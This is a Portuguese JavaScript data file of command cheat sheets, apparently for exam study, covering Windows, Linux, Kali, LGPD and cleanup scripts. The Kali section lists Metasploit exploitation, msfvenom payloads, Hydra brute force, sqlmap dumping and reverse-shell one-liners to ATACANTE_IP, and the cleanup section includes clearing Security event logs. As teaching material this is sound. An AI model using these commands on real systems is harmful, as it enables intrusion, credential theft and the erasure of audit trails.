// Atalhos: prompts de comando, LGPD, scripts, rede, estratégia de ataques e defesa (elite)

export const categoriasAtalhos = [
  { id: 'windows', nome: 'Windows', cor: '#0078d4' },
  { id: 'mac', nome: 'macOS', cor: '#555' },
  { id: 'linux', nome: 'Linux', cor: '#fcc624' },
  { id: 'kali', nome: 'Kali Linux', cor: '#557c94' },
  { id: 'lgpd', nome: 'LGPD', cor: '#0d9488' },
  { id: 'scripts', nome: 'Scripts limpeza', cor: '#10b981' },
  { id: 'rede', nome: 'Rede', cor: '#3b82f6' },
  { id: 'ataques', nome: 'Estratégia ataques', cor: '#ef4444' },
  { id: 'defesa', nome: 'Estratégia defesa', cor: '#10b981' },
  { id: 'conformidade', nome: 'Conformidade / ISO', cor: '#8b5cf6' },
];

export const atalhos = [
  // ========== WINDOWS ==========
  {
    id: 'win-prompt',
    categoriaId: 'windows',
    titulo: 'Prompt de comando – Windows (CMD/PowerShell) – todos os comandos e pegadinhas',
    blocos: [
      // --- Abertura e ambiente ---
      { label: 'Abrir CMD e PowerShell', codigo: 'CMD: Win+R → cmd → Enter\nCMD admin: Win+X → "Terminal (Admin)" ou "Prompt de Comando (Admin)"\nPowerShell: Win+X → Windows PowerShell\nPowerShell 7: pwsh (se instalado)\nSair: exit' },
      { label: 'Navegação (CMD)', codigo: 'cd ou chdir       # mudar diretório (ambos iguais no CMD)\ncd \\              # raiz do disco atual\ncd C:\\Pasta       # ir para C:\\Pasta\ncd ..             # pasta anterior\ncd /d D:\\         # trocar de unidade e pasta\ndir ou dir /p     # listar ( /p pausa, /w colunas )\npushd pasta       # entrar e guardar; popd volta\ncls               # limpar tela' },
      { label: 'Arquivos e pastas (CMD)', codigo: 'copy origem dest     # copiar arquivo\nxcopy orig dest /E   # copiar árvore (pastas)\nmove orig dest      # mover/renomear\ndel arquivo        # apagar (erase é igual)\nrd pasta           # remover pasta vazia\nrd /s /q pasta     # remover pasta e conteúdo (perigoso!)\nmd ou mkdir pasta  # criar pasta\ntype arquivo.txt   # mostrar conteúdo\nmore arquivo.txt   # paginar\nattrib +h arquivo # ocultar; -h desocultar' },
      { label: 'Sistema (CMD)', codigo: 'systeminfo        # SO, host, patch, rede\nhostname          # nome do computador\nver               # versão do Windows\nwhoami            # usuário atual (DOMÍNIO\\user)\nwhoami /priv      # privilégios do token\nwhoami /groups    # grupos\necho %USERNAME%   # variável de usuário' },
      { label: 'Processos (CMD)', codigo: 'tasklist              # listar processos\ntasklist /v            # mais detalhes\ntasklist /FI "IMAGENAME eq notepad.exe"\ntaskkill /PID 1234 /F   # matar por PID ( /F forçar )\ntaskkill /IM notepad.exe /F   # matar por nome\nstart notepad.exe       # abrir programa\nstart "" "C:\\caminho com espaco\\app.exe"' },
      { label: 'Rede (CMD)', codigo: 'ipconfig              # IP resumido\nipconfig /all          # detalhes (MAC, DNS, DHCP)\nipconfig /release      # liberar IP (DHCP)\nipconfig /renew        # renovar IP\nipconfig /flushdns     # limpar cache DNS\nping 8.8.8.8           # testar (Ctrl+C parar)\nping -n 4 host\ntracert google.com     # rota (saltos)\npathping google.com    # rota + latência\nnetstat -an            # conexões e portas\nnetstat -ano           # + PID do processo\nnslookup google.com    # consulta DNS' },
      { label: 'Usuários e compartilhamentos (CMD)', codigo: 'net user                 # listar usuários locais\nnet user nome senha /add   # criar usuário (admin)\nnet localgroup Administrators   # listar admins\nnet share                 # compartilhamentos\nnet use                   # drives mapeados\nnet use Z: \\\\servidor\\pasta   # mapear drive' },
      { label: 'Variáveis e ambiente (CMD)', codigo: 'set                    # listar variáveis\nset VAR=valor        # definir (só na sessão)\necho %PATH%\necho %TEMP%\nset PATH=%PATH%;C:\\MinhaPasta\n%VAR% expande na hora da execução (batch).' },
      { label: 'Redirecionamento e pipe (CMD)', codigo: 'dir > saida.txt       # redirecionar saída (sobrescreve)\ndir >> saida.txt      # acrescentar\ncomando < entrada.txt # entrada\ncomando1 | comando2   # pipe (saída de 1 vira entrada de 2)\necho texto > arquivo\ntype arquivo | more' },
      { label: 'Batch básico (CMD)', codigo: '@echo off         # não mostrar o comando\necho Mensagem\npause             # "Pressione qualquer tecla"\nif exist arquivo (echo Existe) else (echo Nao)\nfor %i in (1 2 3) do echo %i\nREM ou ::  comentário' },
      { label: 'PowerShell – equivalentes rápidos', codigo: 'dir      → Get-ChildItem (ou gci)\ncd       → Set-Location (sl)\ncopy     → Copy-Item\ndel      → Remove-Item\ntype     → Get-Content\ncls      → Clear-Host\nwhoami   → whoami (igual)\ntasklist → Get-Process' },
      // --- Pegadinhas ---
      { label: 'Pegadinha 1 – Comandos duplicados', codigo: 'No CMD, estes são o MESMO comando (alias):\ncd = chdir   |   del = erase   |   md = mkdir   |   rd = rmdir\nNão confunda: dir lista arquivos; chdir (cd) muda de pasta.\nPergunta clássica: "Qual comando lista arquivos?" → dir. chdir muda pasta.' },
      { label: 'Pegadinha 2 – Comandos perigosos', codigo: 'del *.*        # apaga TUDO no diretório atual (confirma em alguns casos)\nrd /s /q C:\\Pasta   # apaga pasta e todo conteúdo SEM perguntar\nformat C:        # formata o disco (destrutivo)\nEm provas: "Qual NÃO deve ser usado sem cuidado?" → esses três.' },
      { label: 'Pegadinha 3 – Ordem dos parâmetros', codigo: 'taskkill /PID 1234 /F   → correto (matar PID 1234)\ntaskkill 1234 /F        → ERRADO; no CMD o /PID é obrigatório antes do número.\nCorreto: taskkill /PID <número> /F ou taskkill /IM nome.exe /F' },
      { label: 'Pegadinha 4 – CMD vs PowerShell', codigo: 'CMD: where notepad   → caminho do notepad\nPowerShell: where.exe notepad (Get-Command notepad)\nCMD: dir   PowerShell: Get-ChildItem (dir funciona como alias)\nCMD: variáveis %VAR%   PowerShell: $VAR\nNão confundir: no CMD não existe Get-Command.' },
      { label: 'Pegadinha 5 – Caminhos com espaço', codigo: 'Errado: cd C:\\Program Files   → "Files" vira segundo argumento.\nCorreto: cd "C:\\Program Files"\nCorreto: cd C:\\Program*  (wildcard)\nstart "" "C:\\pasta com espaco\\app.exe"   # aspas no caminho.' },
      { label: 'Pegadinha 6 – Barra e barra invertida', codigo: 'CMD/PowerShell: barra invertida \\ para caminhos Windows (C:\\Pasta).\nAlguns comandos aceitam / para parâmetros: dir /w, ipconfig /all.\nPergunta: "Qual caractere separa pastas no Windows?" → \\ (barra invertida).' },
      { label: 'Pegadinha 7 – ipconfig /release e /renew', codigo: '/release  → libera o IP atual (pode perder conexão)\n/renew    → pede novo IP ao DHCP\nOrdem típica em "não conecta": ipconfig /release e depois ipconfig /renew.\nSó funciona em interface DHCP; IP fixo não renova.' },
      { label: 'Pegadinha 8 – netstat -an vs -ano', codigo: 'netstat -an   → mostra conexões e portas (Local, Foreign, State)\nnetstat -ano  → acrescenta a coluna PID (processo que usa a porta)\nPara "qual processo usa a porta 443?" → netstat -ano e depois tasklist /FI "PID eq X"' },
      { label: 'Pegadinha 9 – whoami e privilégios', codigo: 'whoami        → nome do usuário (e domínio se houver)\nwhoami /priv  → lista privilégios do token (ex.: SeDebugPrivilege)\nwhoami /groups → grupos do usuário\nPergunta: "Comando para ver privilégios no Windows?" → whoami /priv' },
      { label: 'Pegadinha 10 – echo e redirecionamento', codigo: 'echo teste > arquivo.txt   → arquivo fica com "teste" (e quebra de linha)\necho teste >> arquivo.txt  → acrescenta ao fim do arquivo\nEm batch: echo off desliga o eco dos comandos; @echo off desliga e não mostra a linha do echo off.' },
    ],
  },
  {
    id: 'win-powershell',
    categoriaId: 'windows',
    titulo: 'PowerShell – Segurança e rede (básico ao avançado)',
    blocos: [
      // --- Básico ---
      { label: '1. Ambiente e ajuda (básico)', codigo: '$PSVersionTable          # versão do PowerShell\nGet-Host                 # host atual\nGet-Command *Net*        # cmdlets com "Net"\nGet-Help Get-NetIPAddress -Full   # ajuda completa\nSet-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned   # permitir scripts locais' },
      { label: '2. Rede – configuração (básico)', codigo: 'Get-NetIPConfiguration   # resumo de todas as interfaces\nGet-NetIPAddress         # todos os endereços IP\nGet-NetAdapter            # adaptadores (nome, status, MAC)\nGet-DnsClientServerAddress -AddressFamily IPv4   # servidores DNS configurados' },
      { label: '3. Rede – conectividade (básico)', codigo: 'Test-Connection 8.8.8.8 -Count 4\nTest-Connection google.com\n# Resolver nome para IP:\nResolve-DnsName google.com\n[System.Net.Dns]::GetHostAddresses("google.com")' },
      { label: '4. Rede – conexões e portas (intermediário)', codigo: 'Get-NetTCPConnection     # todas as conexões TCP\nGet-NetTCPConnection -State Listen   # só portas em escuta\nGet-NetUDPEndpoint       # portas UDP em escuta\nGet-NetTCPConnection | Where-Object {$_.LocalPort -eq 443}   # quem usa a porta 443' },
      { label: '5. Rede – teste avançado (Test-NetConnection)', codigo: 'Test-NetConnection -ComputerName 8.8.8.8 -Port 443\nTest-NetConnection -ComputerName google.com -Port 443 -InformationLevel Detailed\n# Testar se porta está aberta (TcpTestSucceeded = True/False)' },
      { label: '6. Rede – rotas e ARP', codigo: 'Get-NetRoute              # tabela de roteamento\nGet-NetNeighbor -AddressFamily IPv4   # cache ARP\nRoute print              # (comando CMD via PowerShell)\nnetsh interface ip show config' },
      { label: '7. Rede – DNS e cache', codigo: 'Get-DnsClientCache        # cache de resolução DNS\nClear-DnsClientCache     # limpar cache DNS (requer admin)\nRegister-Dns             # re-registrar no DNS (ipconfig /registerdns)' },
      // --- Firewall ---
      { label: '8. Firewall – listar regras (básico)', codigo: 'Get-NetFirewallRule | Where-Object {$_.Enabled -eq "True"} | Select-Object DisplayName, Direction, Action\nGet-NetFirewallProfile    # Domain, Private, Public (estado e configuração)\nGet-NetFirewallRule -DisplayGroup "Remote Desktop"   # regras de um grupo' },
      { label: '9. Firewall – regras por perfil (intermediário)', codigo: 'Get-NetFirewallRule -Enabled True | Where-Object {$_.Profile -eq "Domain"}\nGet-NetFirewallPortFilter | Where-Object {$_.LocalPort -eq 3389}\n# Habilitar/desabilitar perfil (admin):\nSet-NetFirewallProfile -Profile Domain,Private,Public -Enabled True' },
      { label: '10. Firewall – nova regra (avançado)', codigo: '# Exemplo: permitir entrada na porta 443 (admin)\nNew-NetFirewallRule -DisplayName "HTTPS In" -Direction Inbound -Protocol TCP -LocalPort 443 -Action Allow\n# Remover regra: Remove-NetFirewallRule -DisplayName "HTTPS In"\n# Bloquear saída para IP: New-NetFirewallRule -DisplayName "Block IP" -Direction Outbound -RemoteAddress 1.2.3.4 -Action Block' },
      // --- Eventos e logs ---
      { label: '11. Eventos – logs básicos', codigo: 'Get-EventLog -List                    # listar logs disponíveis\nGet-EventLog -LogName Security -Newest 20\nGet-EventLog -LogName System -Newest 10\nGet-WinEvent -ListLog *Security* | Select-Object LogName' },
      { label: '12. Eventos – logon (4624) e falha (4625)', codigo: '# Logons bem-sucedidos (4624)\nGet-WinEvent -FilterHashtable @{LogName="Security"; Id=4624} -MaxEvents 10\n# Falhas de logon (4625)\nGet-WinEvent -FilterHashtable @{LogName="Security"; Id=4625} -MaxEvents 10\n# Exportar eventos: Get-WinEvent ... | Export-Csv eventos.csv' },
      { label: '13. Eventos – filtros avançados', codigo: '$inicio = (Get-Date).AddDays(-1)\nGet-WinEvent -FilterHashtable @{LogName="Security"; Id=4624; StartTime=$inicio} -MaxEvents 100\n# XML filter para mais controle:\nGet-WinEvent -FilterXml \'<Query><Select Path="Security">*[System[(EventID=4624)]]</Select></Query>\' -MaxEvents 20' },
      // --- Usuários e grupos ---
      { label: '14. Usuários e grupos locais', codigo: 'Get-LocalUser            # usuários locais\nGet-LocalGroup            # grupos locais\nGet-LocalGroupMember -Group "Administrators"\nGet-LocalUser | Where-Object {$_.Enabled -eq $true} | Select-Object Name, SID' },
      { label: '15. Usuários – criar/alterar (admin)', codigo: 'New-LocalUser -Name "novo_user" -Password (ConvertTo-SecureString "SenhaForte!" -AsPlainText -Force)\nAdd-LocalGroupMember -Group "Users" -Member "novo_user"\nDisable-LocalUser -Name "usuario_desativar"\nRemove-LocalUser -Name "usuario_remover"' },
      // --- Serviços e processos ---
      { label: '16. Serviços e processos', codigo: 'Get-Service                # todos os serviços\nGet-Service -Name "Spooler" | Start-Service\nGet-Process              # processos (como tasklist)\nGet-Process | Where-Object {$_.CPU -gt 100}\nStop-Process -Id 1234 -Force   # matar processo' },
      { label: '17. Processos e rede (quem usa a porta)', codigo: '$con = Get-NetTCPConnection -State Listen | Where-Object {$_.LocalPort -eq 443}; Get-Process -Id $con.OwningProcess\n# Ou: netstat -ano e tasklist /FI "PID eq X"' },
      // --- Segurança e política ---
      { label: '18. Política de execução (scripts)', codigo: 'Get-ExecutionPolicy -List\nSet-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned\n# Bypass só para sessão: powershell -ExecutionPolicy Bypass -File script.ps1' },
      { label: '19. Hash de arquivo (integridade)', codigo: 'Get-FileHash C:\\caminho\\arquivo.exe -Algorithm SHA256\nGet-FileHash .\\script.ps1 -Algorithm SHA256 | Format-List\n# Comparar com hash publicado para verificar integridade/download.' },
      { label: '20. Auditoria e políticas locais', codigo: 'auditpol /get /category:*   # políticas de auditoria (admin)\nauditpol /set /subcategory:"Logon" /success:enable /failure:enable\nGet-AuditPolicy -Subcategory "Logon"   # (módulo AuditPolicyModule se instalado)' },
      // --- Remoto e WinRM ---
      { label: '21. PowerShell remoto (WinRM)', codigo: 'Enable-PSRemoting -Force   # habilitar WinRM (admin, em cada máquina)\nTest-WSMan -ComputerName 192.168.1.10\nEnter-PSSession -ComputerName 192.168.1.10 -Credential (Get-Credential)\nInvoke-Command -ComputerName PC1,PC2 -ScriptBlock { Get-NetIPConfiguration }' },
      { label: '22. Módulos úteis (rede e segurança)', codigo: 'Get-Module -ListAvailable\nImport-Module DnsClient\nImport-Module NetSecurity   # Get-DnsClient, Test-NetConnection, etc.\n# Nmap-style em PS: Test-NetConnection com loop em portas (1..1024)' },
    ],
  },

  // ========== MAC ==========
  {
    id: 'mac-terminal',
    categoriaId: 'mac',
    titulo: 'Terminal – macOS',
    blocos: [
      { label: 'Navegação', codigo: 'cd ~/Documents       # ir para pasta\nls -la               # listar (detalhes)\npwd                  # diretório atual\nopen .               # abrir Finder aqui' },
      { label: 'Sistema e rede', codigo: 'whoami\nid\nifconfig | grep "inet "\nnetstat -an | grep LISTEN\nping -c 4 8.8.8.8' },
      { label: 'Processos', codigo: 'ps aux | grep nome\nkill -9 PID\ntop                  # processos em tempo real' },
      { label: 'Permissões', codigo: 'ls -la              # ver permissões\nchmod 755 arquivo.sh\nchown user:group arquivo' },
    ],
  },

  // ========== LINUX ==========
  {
    id: 'linux-bash',
    categoriaId: 'linux',
    titulo: 'Bash / Linux – Comandos essenciais',
    blocos: [
      { label: 'Sistema e usuário', codigo: 'whoami\nid\nuname -a\ncat /etc/os-release' },
      { label: 'Rede', codigo: 'ip a\n# ou: ifconfig\nip route\nss -tulpn\n# ou: netstat -tulpn\nping -c 4 8.8.8.8' },
      { label: 'Processos e serviços', codigo: 'ps aux\nps aux | grep nome\ntop   # ou htop\nsystemctl list-units --type=service\nsystemctl status nome-servico' },
      { label: 'Arquivos e permissões', codigo: 'ls -la\nchmod 755 script.sh\nchown user:group arquivo\nfind / -name "*.conf" 2>/dev/null' },
      { label: 'Logs', codigo: 'tail -f /var/log/syslog\njournalctl -xe\njournalctl -u nginx -f' },
    ],
  },

  // ========== KALI LINUX ==========
  {
    id: 'kali-recon',
    categoriaId: 'kali',
    titulo: 'Kali Linux – Reconhecimento e varredura (todos os comandos)',
    blocos: [
      { label: '1. Nmap – descoberta de hosts', codigo: 'nmap -sn 192.168.1.0/24           # ping sweep (hosts vivos)\nnmap -sn -PR 192.168.1.0/24       # + ARP (rede local)\nnmap -Pn 192.168.1.1              # pular ping (host que bloqueia ICMP)\nnmap -iL alvos.txt -sn             # hosts de um arquivo' },
      { label: '2. Nmap – varredura de portas', codigo: 'nmap -sS 192.168.1.1              # SYN stealth (rápido, precisa root)\nnmap -sT 192.168.1.1              # TCP connect (sem root)\nnmap -sV 192.168.1.1              # detecção de versão\nnmap -p 80,443,8080 192.168.1.1   # portas específicas\nnmap -p- 192.168.1.1              # todas as portas (1-65535)' },
      { label: '3. Nmap – combinações e scripts', codigo: 'nmap -sC -sV -p- 192.168.1.1    # default scripts + versão + todas portas\nnmap -sV --script vuln 192.168.1.1   # scripts de vulnerabilidade\nnmap -O 192.168.1.1                # detecção de OS (requer root)\nnmap -T4 -A 192.168.1.1            # agressivo: OS, versão, scripts' },
      { label: '4. Nmap – saída e desempenho', codigo: 'nmap -oN scan.txt 192.168.1.1     # saída normal\nnmap -oX scan.xml 192.168.1.1     # XML\nnmap -oA scan 192.168.1.1        # todas ( .nmap .xml .gnmap )\n-T0 a -T5   # velocidade (T4 comum); -T0 mais lento e discreto' },
      { label: '5. OSINT – DNS e whois', codigo: 'whois dominio.com\ndig dominio.com ANY\n dig dominio.com MX\nhost dominio.com\nnslookup dominio.com\ndnsenum dominio.com               # enumeração DNS (subdomínios)' },
      { label: '6. OSINT – e-mail e subdomínios', codigo: 'theHarvester -d dominio.com -b bing,google\nsublist3r -d dominio.com\namass enum -d dominio.com         # subdomínios (passivo/ativo)\nrecon-ng                          # framework OSINT (interativo)' },
      { label: '7. Varredura web – diretórios', codigo: 'dirb http://192.168.1.1 /usr/share/wordlists/dirb/common.txt\ngobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirb/common.txt -t 50\ngobuster dir -u http://192.168.1.1 -w wordlist.txt -x php,html\nffuf -u http://192.168.1.1/FUZZ -w wordlist.txt\nwfuzz -c -z file,wordlist.txt http://192.168.1.1/FUZZ' },
      { label: '8. Varredura web – vulnerabilidades', codigo: 'nikto -h http://192.168.1.1\nnikto -h https://192.168.1.1 -ssl\nwhatweb http://192.168.1.1       # tecnologias\nwpscan --url http://192.168.1.1   # WordPress\nsqlmap -u "http://site/page?id=1" --dbs   # SQL injection (exploit)' },
      { label: '9. SMB e NetBIOS', codigo: 'nbtscan 192.168.1.0/24\nenum4linux -a 192.168.1.1\nsmbclient -L //192.168.1.1 -N\nsmbmap -H 192.168.1.1\nnmap -p 139,445 --script smb-enum-shares,smb-os-discovery 192.168.1.1' },
      { label: '10. SNMP e outros serviços', codigo: 'onesixtyone -c /usr/share/wordlists/snmp.txt 192.168.1.0/24\nsnmpwalk -v2c -c public 192.168.1.1\nnmap -sU -p 161 --script snmp-brute 192.168.1.1' },
      { label: '11. Rede local – ARP e discovery', codigo: 'netdiscover -r 192.168.1.0/24\narp-scan -l\narp-scan -I eth0 192.168.1.0/24' },
      { label: '12. Varredura rápida (masscan)', codigo: 'masscan -p80,443,22 192.168.1.0/24 --rate=1000\nmasscan -p1-65535 192.168.1.1 --rate=1000   # muito rápido, depois nmap no alvo' },
    ],
  },
  {
    id: 'kali-exploit',
    categoriaId: 'kali',
    titulo: 'Kali – Exploração e pós-exploração (todos os comandos)',
    blocos: [
      { label: '1. Metasploit – console e busca', codigo: 'msfconsole\nsearch exploit eternalblue\nsearch type:exploit platform:windows smb\nshow exploits\nuse exploit/windows/smb/ms17_010_eternalblue' },
      { label: '2. Metasploit – opções e execução', codigo: 'set RHOSTS 192.168.1.1\nset RPORT 445\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 10.0.0.5\nset LPORT 4444\nshow options\nrun   # ou exploit' },
      { label: '3. Metasploit – payloads comuns', codigo: 'windows/meterpreter/reverse_tcp    # shell reversa (Windows)\nwindows/shell_reverse_tcp         # cmd reverso\nlinux/x86/meterpreter/reverse_tcp\ngeneric/shell_reverse_tcp\nset PAYLOAD windows/x64/meterpreter/reverse_https   # evasão' },
      { label: '4. Metasploit – listeners e sessões', codigo: 'use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 10.0.0.5\nset LPORT 4444\nrun -j   # em background\nsessions -l\nsessions -i 1   # interagir com sessão 1\nbackground       # colocar sessão em background' },
      { label: '5. Meterpreter – comandos básicos', codigo: 'sysinfo\ngetuid\npwd / cd / cat / upload / download\nshell              # abrir shell no alvo\nexit               # sair do shell (mantém sessão)\nhashdump           # hashes NTLM (Windows)\nps\nmigrate <PID>      # migrar para outro processo' },
      { label: '6. Meterpreter – persistência e pós-exploração', codigo: 'run post/windows/gather/enum_logged_on_users\nrun post/windows/gather/enum_users\nrun post/windows/manage/migrate\nrun persistence -X -L C:\\\\ -p 4444 -i 30 -r ATACANTE_IP\nrun post/windows/gather/credential_collector' },
      { label: '7. Hashcat – quebra de hashes', codigo: 'hashcat -m 0 hashes.txt wordlist.txt     # MD5\nhashcat -m 1000 hashes.txt wordlist.txt   # NTLM\nhashcat -m 1800 hashes.txt wordlist.txt   # sha512crypt ($6$)\nhashcat -m 0 hash.txt wordlist.txt -O     # otimizado\nhashcat -m 1000 -a 3 hash.txt ?d?d?d?d?d?d   # máscara 6 dígitos' },
      { label: '8. John the Ripper', codigo: 'john --wordlist=wordlist.txt hash.txt\njohn hash.txt              # modo single e incremental\njohn --format=raw-MD5 hash.txt\nunshadow passwd shadow > unshadow.txt\njohn unshadow.txt' },
      { label: '9. Hydra – força bruta (login)', codigo: 'hydra -l user -P wordlist.txt ssh://192.168.1.1\nhydra -L users.txt -P pass.txt 192.168.1.1 ftp\nhydra -l admin -P rockyou.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"\nhydra -l user -P pass.txt 192.168.1.1 rdp\nhydra -l user -P pass.txt 192.168.1.1 smb' },
      { label: '10. SQLmap – SQL injection', codigo: 'sqlmap -u "http://site/page?id=1" --dbs\nsqlmap -u "http://site/page?id=1" -D dbname --tables\nsqlmap -u "http://site/page?id=1" -D dbname -T users --columns\nsqlmap -u "http://site/page?id=1" -D dbname -T users -C user,pass --dump\nsqlmap -u "http://site/page?id=1" --os-shell' },
      { label: '11. Searchsploit e exploits', codigo: 'searchsploit apache 2.4\nsearchsploit -m 12345   # copiar exploit para o diretório atual\nsearchsploit -x 12345   # ver conteúdo' },
      { label: '12. Reverse shells – netcat e bash', codigo: '# Atacante: nc -lvnp 4444\n# Alvo Linux: bash -i >& /dev/tcp/ATACANTE_IP/4444 0>&1\n# Alvo: nc -e /bin/sh ATACANTE_IP 4444\n# Alvo: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATACANTE_IP 4444 >/tmp/f' },
      { label: '13. Reverse shells – Python, PHP, etc.', codigo: 'python -c \'import socket,subprocess,os;s=...\'   # payload Python\nphp -r \'$sock=fsockopen("IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'\n# Gerar payloads: msfvenom -l payloads | grep reverse' },
      { label: '14. Msfvenom – gerar payloads', codigo: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o payload.exe\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o payload.elf\nmsfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -o shell.php\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f vba -o macro.vba' },
      { label: '15. Pós-exploração – enumeração Windows', codigo: 'whoami /all\nsysteminfo\nnet user\nnet localgroup administrators\nnet share\nipconfig /all\nnetstat -ano\nschtasks /query /fo LIST /v\nwmic product get name,version' },
      { label: '16. Pós-exploração – enumeração Linux', codigo: 'id\nuname -a\ncat /etc/passwd\ncat /etc/shadow  # root\nsudo -l\nfind / -perm -4000 2>/dev/null   # SUID\ncat /etc/crontab\nps aux\nnetstat -tulpn\n# Scripts: linpeas.sh, LinEnum' },
      { label: '17. Escalação de privilégios (conceitos)', codigo: 'Windows: kernel exploit, UAC bypass, token impersonation, serviço vulnerável, GPO.\nLinux: kernel exploit, SUID, sudo misconfig, cron, credenciais em arquivos.\nFerramentas: winpeas, linpeas, mimikatz (Windows), searchsploit.' },
    ],
  },

  // ========== LGPD ==========
  {
    id: 'lgpd-artigos',
    categoriaId: 'lgpd',
    titulo: 'LGPD – Atalhos por artigos',
    blocos: [
      { label: 'Art. 1º–3º – Objeto e aplicação', codigo: 'Lei 13.709/2018. Objeto: proteção dos dados pessoais. Aplica-se a tratamento em meios digitais ou não, por pessoa natural ou jurídica, pública ou privada, no Brasil ou oferta de bens/serviços a pessoas no Brasil.' },
      { label: 'Art. 5º – Definições', codigo: 'Dado pessoal: informação relacionada a pessoa natural identificada ou identificável.\nTitular: pessoa natural a quem se referem os dados.\nControlador: quem decide sobre o tratamento.\nOperador: quem realiza o tratamento em nome do controlador.\nANPD: Autoridade Nacional de Proteção de Dados.' },
      { label: 'Art. 6º – Princípios', codigo: 'Finalidade; adequação; necessidade; livre acesso; qualidade; transparência; segurança; prevenção; não discriminação; responsabilização e prestação de contas.' },
      { label: 'Art. 7º – Bases legais (tratamento sem consentimento)', codigo: 'I obrigação legal; II políticas públicas; III estudos (órgão de pesquisa); IV execução de contrato; V exercício de direitos em processo; VI proteção da vida; VII tutela da saúde; VIII interesse legítimo do controlador; IX proteção do crédito; X garantia de prevenção à fraude; XI consentimento do titular.' },
      { label: 'Art. 18 – Direitos do titular', codigo: 'Confirmação de tratamento; acesso; correção; anonimização/bloqueio/eliminação; portabilidade; eliminação (dados tratados com consentimento); informação sobre compartilhamento; revogação do consentimento.' },
      { label: 'Art. 41–45 – Sanções', codigo: 'Advertência; multa (até 2% do faturamento, limitada a R$ 50 milhões por infração); multa diária; publicização da infração; bloqueio ou eliminação dos dados. Processo administrativo na ANPD.' },
    ],
  },

  // ========== SCRIPTS LIMPEZA ==========
  {
    id: 'script-win-limpeza',
    categoriaId: 'scripts',
    titulo: 'Limpeza CMD e PowerShell – todos os comandos + Desligar/Reiniciar/Agendar',
    blocos: [
      // --- Limpeza CMD (todos) ---
      { label: '1. Limpeza CMD – Temp e pastas temporárias', codigo: 'REM Executar CMD como Administrador para pastas do sistema\ncd %TEMP%\ndel /q * 2>nul\ncd %SystemRoot%\\Temp\ndel /q * 2>nul\ncd %SystemRoot%\\Prefetch\ndel /q * 2>nul\nREM Limpar temp do usuário\ndel /q /s %TEMP%\\* 2>nul\nREM Limpar cache do navegador (caminho varia)\nREM Chrome: del /q /s "%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Cache\\*" 2>nul' },
      { label: '2. Limpeza CMD – DNS e rede', codigo: 'ipconfig /flushdns       # limpar cache DNS\nipconfig /registerdns    # reregistrar no DNS\nipconfig /release        # liberar IP (pode desconectar)\nipconfig /renew          # renovar IP (DHCP)' },
      { label: '3. Limpeza CMD – Reset de rede (avançado)', codigo: 'netsh winsock reset    # reset do Winsock\nnetsh int ip reset     # reset da pilha TCP/IP\nREM Reiniciar o PC depois para aplicar.' },
      { label: '4. Limpeza CMD – Lixeira e arquivos temporários', codigo: 'REM Esvaziar lixeira (CMD)\nrd /s /q %SystemDrive%\\$Recycle.bin 2>nul\nREM Ou use: cleanmgr (Limpeza de disco – gráfico)\nREM Limpar logs antigos (admin): wevtutil cl Security' },
      { label: '5. Limpeza CMD – Script batch completo', codigo: '@echo off\ncd /d %TEMP%\ndel /q * 2>nul\ncd %SystemRoot%\\Temp\ndel /q * 2>nul\nipconfig /flushdns\nipconfig /registerdns\necho Limpeza concluida.\npause' },
      // --- Limpeza PowerShell (todos) ---
      { label: '6. Limpeza PowerShell – Temp e cache', codigo: 'Remove-Item -Path $env:TEMP\\* -Recurse -Force -ErrorAction SilentlyContinue\nRemove-Item -Path C:\\Windows\\Temp\\* -Recurse -Force -ErrorAction SilentlyContinue\n# Limpar cache do PowerShell (histórico de comandos)\nClear-History' },
      { label: '7. Limpeza PowerShell – DNS', codigo: 'Clear-DnsClientCache     # limpar cache DNS (admin)\nRegister-Dns             # reregistrar no DNS' },
      { label: '8. Limpeza PowerShell – Lixeira', codigo: 'Clear-RecycleBin -Force  # esvaziar lixeira (sem confirmação)\n# Por unidade: Clear-RecycleBin -DriveLetter C -Force' },
      { label: '9. Limpeza PowerShell – Prefetch e outros', codigo: 'Remove-Item -Path C:\\Windows\\Prefetch\\* -Force -ErrorAction SilentlyContinue\n# Limpar eventos (admin): Clear-EventLog -LogName Security  # use com cuidado' },
      { label: '10. Limpeza PowerShell – Script completo', codigo: 'Clear-DnsClientCache\nRemove-Item $env:TEMP\\* -Recurse -Force -EA SilentlyContinue\nClear-RecycleBin -Force\nWrite-Host "Limpeza concluida."' },
      // --- Desligar, reiniciar, agendar, cancelar ---
      { label: '11. Cancelar desligamento/reinício programado', codigo: 'shutdown /a\nREM /a = abortar. Cancela o shutdown ou restart agendado. Executar antes do tempo acabar.' },
      { label: '12. Agendar desligamento (temporizado)', codigo: 'shutdown /s /t 3600       # desligar em 3600 segundos (1 hora)\nshutdown /s /t 600 /c "PC desligara em 10 min"   # com mensagem\nREM /s = desligar; /t = segundos; /c = comentário (max 512 caracteres)' },
      { label: '13. Agendar reinício (temporizado)', codigo: 'shutdown /r /t 1800        # reiniciar em 30 minutos\nshutdown /r /t 60 /c "Reinicio em 1 minuto"' },
      { label: '14. Desligar agora', codigo: 'shutdown /s /t 0\nREM Ou: shutdown /s /t 1   # 1 segundo (permite fechar programas)' },
      { label: '15. Reiniciar agora', codigo: 'shutdown /r /t 0\nREM Ou: shutdown /r /t 1' },
      { label: '16. Desligar e reiniciar – resumo (CMD/PowerShell)', codigo: 'shutdown /a           # cancelar agendamento\nshutdown /s /t N       # desligar em N segundos\nshutdown /r /t N       # reiniciar em N segundos\nshutdown /s /t 0       # desligar agora\nshutdown /r /t 0       # reiniciar agora\n# No PowerShell os mesmos comandos: shutdown /s /t 0' },
    ],
  },
  {
    id: 'script-linux-limpeza',
    categoriaId: 'scripts',
